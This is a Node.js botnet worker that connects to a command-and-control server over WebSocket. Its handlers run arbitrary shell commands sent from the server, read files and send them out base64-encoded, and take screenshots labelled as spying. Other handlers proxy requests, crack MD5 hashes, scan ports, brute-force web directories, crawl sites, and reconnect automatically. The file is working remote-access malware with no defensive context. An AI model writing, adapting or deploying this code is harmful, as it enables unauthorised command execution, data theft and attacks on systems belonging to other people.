const WebSocket = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const { exec } = require('child_process'); 
const net = require('net');

const ACCESS_KEY = process.env.ACCESS_KEY;
if (!ACCESS_KEY) { console.error("Error: ACCESS_KEY not found."); process.exit(1); }

const WEBSOCKET_URL = `wss://scavenger-brain.onrender.com?key=${ACCESS_KEY}`;

function connect() {
    const ws = new WebSocket(WEBSOCKET_URL);

    function logToC2(msg) {
        try { ws.send(JSON.stringify({ type: 'SHELL_LOG', output: msg })); } catch(e){}
        console.log(msg);
    }

    ws.on('open', () => { console.log("Connected to C2."); ws.send(JSON.stringify({ type: 'REGISTER_WORKER' })); });

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);

            if (msg.type === 'MINING_JOB') {
                crack(ws, msg.start, msg.end, msg.target);
            } 
            else if (msg.type === 'STOP') {
                logToC2(`[SYSTEM] Target neutralized: ${msg.solution}. Standing by.`);
            }
            else if (msg.type === 'HTTP_PROXY') {
                logToC2(`[PROXY] Routing request to: ${msg.url}`);
                fetch(msg.url)
                    .then(async (response) => {
                        const text = await response.text();
                        ws.send(JSON.stringify({ type: 'PROXY_RESULT', requestId: msg.requestId, status: response.status, body: text.substring(0, 500) + "..." }));
                    })
                    .catch(err => { logToC2(`[PROXY ERROR] ${err.message}`); });
            }
            else if (msg.type === 'EXEC_CMD') {
                logToC2(`[SHELL] Executing: ${msg.command}`);
                exec(msg.command, { timeout: 10000 }, (error, stdout, stderr) => {
                    ws.send(JSON.stringify({ type: 'SHELL_RESULT', output: stdout || stderr || (error ? error.message : "Done.") }));
                });
            }
            else if (msg.type === 'EXFIL_CMD') {
                logToC2(`[EXFIL] Extracting: ${msg.path}`);
                if (fs.existsSync(msg.path)) {
                    try {
                        const fileData = fs.readFileSync(msg.path, { encoding: 'base64' });
                        ws.send(JSON.stringify({ type: 'EXFIL_RESULT', filename: msg.path.split('/').pop(), data: fileData }));
                    } catch (e) { logToC2(`[EXFIL ERROR] Read failed: ${e.message}`); }
                } else { logToC2(`[EXFIL ERROR] File not found: ${msg.path}`); }
            }
            else if (msg.type === 'SNAPSHOT_CMD') {
                logToC2(`[EYE] Spying on: ${msg.url}`);
                const script = `const puppeteer=require('puppeteer');(async()=>{try{const browser=await puppeteer.launch({args:['--no-sandbox']});const page=await browser.newPage();await page.setViewport({width:1280,height:720});await page.goto('${msg.url}',{waitUntil:'networkidle2',timeout:30000});await page.screenshot({path:'evidence.png'});await browser.close();}catch(e){console.error(e);}})();`;
                fs.writeFileSync('camera.js', script);
                const cmd = `npm list puppeteer || npm install puppeteer && node camera.js`;
                exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
                    if (fs.existsSync('evidence.png')) {
                        const fileData = fs.readFileSync('evidence.png', { encoding: 'base64' });
                        ws.send(JSON.stringify({ type: 'EXFIL_RESULT', filename: `snapshot_${Date.now()}.png`, data: fileData }));
                    } else { logToC2(`[EYE ERROR] Snapshot failed.`); }
                });
            }
            else if (msg.type === 'SNIPE_CMD') {
                const ticker = msg.ticker.toLowerCase();
                logToC2(`[SNIPER] Checking price for: ${ticker}`);
                const targetUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${ticker}&vs_currencies=usd&include_24hr_change=true`;
                fetch(targetUrl).then(async (res) => {
                        const json = await res.json();
                        if (json[ticker]) {
                            const price = json[ticker].usd;
                            const change = json[ticker].usd_24h_change.toFixed(2);
                            ws.send(JSON.stringify({ type: 'SNIPE_RESULT', ticker: ticker, mentions: `Price: $${price} (${change}%)` }));
                        } else { logToC2(`[SNIPER] Token '${ticker}' not found on CoinGecko.`); }
                    }).catch(err => { logToC2(`[SNIPER ERROR] API fail: ${err.message}`); });
            }
            else if (msg.type === 'MAP_CMD') {
                const target = msg.url.replace(/\/$/, ""); 
                const workerId = parseInt(process.env.WORKER_ID) || 1;
                const wordlistUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt';
                fetch(wordlistUrl).then(async (res) => {
                    const text = await res.text();
                    const lines = text.split('\n');
                    const chunkSize = Math.ceil(lines.length / 20);
                    const start = (workerId - 1) * chunkSize;
                    const myChunk = lines.slice(start, start + chunkSize);
                    logToC2(`[MAP] Unit ${workerId} scanning sector ${start}-${start+chunkSize}...`);
                    for (const path of myChunk) {
                        if (!path) continue;
                        try {
                            const scanUrl = `${target}/${path}`;
                            const check = await fetch(scanUrl, { method: 'HEAD' }); 
                            if (check.status === 200 || check.status === 403) {
                                ws.send(JSON.stringify({ type: 'MAP_RESULT', path: path, status: check.status, url: scanUrl }));
                            }
                        } catch (err) {}
                    }
                    logToC2(`[MAP] Unit ${workerId} sector scan complete.`);
                }).catch(err => logToC2(`[MAP ERROR] Wordlist fetch failed.`));
            }
            else if (msg.type === 'SCAN_CMD') {
                const target = msg.ip;
                const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5900, 6379, 8080, 27017]; 
                const workerId = parseInt(process.env.WORKER_ID) || 1;
                const myPorts = ports.filter((_, index) => (index % 20) === (workerId - 1));
                if (myPorts.length > 0) logToC2(`[SCAN] Unit ${workerId} checking ports: ${myPorts.join(',')}`);
                myPorts.forEach(port => {
                    const socket = new net.Socket();
                    socket.setTimeout(2000); 
                    socket.on('connect', () => { ws.send(JSON.stringify({ type: 'SCAN_RESULT', port: port, status: 'OPEN', ip: target })); socket.destroy(); });
                    socket.on('timeout', () => { socket.destroy(); });
                    socket.on('error', (err) => { socket.destroy(); });
                    socket.connect(port, target);
                });
            }
            else if (msg.type === 'ARCHIVE_CMD') {
                logToC2(`[ARCHIVE] Preserving: ${msg.url}`);
                const script = `const puppeteer=require('puppeteer');(async()=>{try{const browser=await puppeteer.launch({args:['--no-sandbox']});const page=await browser.newPage();await page.setViewport({width:1920,height:1080});await page.goto('${msg.url}',{waitUntil:'networkidle0',timeout:60000});const pdfName='archive_'+Date.now()+'.pdf';await page.pdf({path:pdfName,format:'A4',printBackground:true});await browser.close();console.log(pdfName);}catch(e){console.error(e);}})();`;
                fs.writeFileSync('archiver.js', script);
                const cmd = `npm list puppeteer || npm install puppeteer && node archiver.js`;
                exec(cmd, { timeout: 90000 }, (error, stdout, stderr) => {
                    const filename = stdout.trim();
                    if (filename && fs.existsSync(filename)) {
                        const fileData = fs.readFileSync(filename, { encoding: 'base64' });
                        ws.send(JSON.stringify({ type: 'EXFIL_RESULT', filename: filename, data: fileData }));
                    } else { logToC2(`[ARCHIVE ERROR] PDF gen failed.`); }
                });
            }
            // --- NEW SPIDER MODULE ---
            else if (msg.type === 'SPIDER_SCOUT') {
                logToC2(`[SPIDER] Scouting target: ${msg.url}`);
                fetch(msg.url)
                    .then(async (res) => {
                        const html = await res.text();
                        const linkRegex = /href=["'](https?:\/\/[^"']+)["']/g;
                        const links = []; let match;
                        while ((match = linkRegex.exec(html)) !== null) { links.push(match[1]); }
                        const uniqueLinks = [...new Set(links)].slice(0, 50);
                        ws.send(JSON.stringify({ type: 'SPIDER_SCOUT_RESULT', links: uniqueLinks, base: msg.url }));
                    })
                    .catch(err => logToC2(`[SPIDER ERROR] Scout failed: ${err.message}`));
            }
            else if (msg.type === 'SPIDER_AUDIT') {
                const target = msg.url;
                const start = Date.now();
                fetch(target, { method: 'HEAD' })
                    .then((res) => {
                        const latency = Date.now() - start;
                        ws.send(JSON.stringify({ type: 'SPIDER_AUDIT_RESULT', url: target, status: res.status, latency: latency }));
                    })
                    .catch(err => { ws.send(JSON.stringify({ type: 'SPIDER_AUDIT_RESULT', url: target, status: 'ERR', latency: 0 })); });
            }

        } catch (e) { console.error("Error processing message:", e); }
    });
    ws.on('close', () => setTimeout(connect, 5000));
    ws.on('error', () => ws.close());
}

function crack(ws, start, end, targetHash) {
    for (let i = start; i < end; i++) {
        const guess = i.toString(); 
        const hash = crypto.createHash('md5').update(guess).digest('hex');
        if (hash === targetHash) {
            ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: guess, hash: hash }));
            return;
        }
    }
    ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: null }));
}
setInterval(() => { console.log(`[HEARTBEAT] System Vitality: 100%`); }, 60000); 
connect();
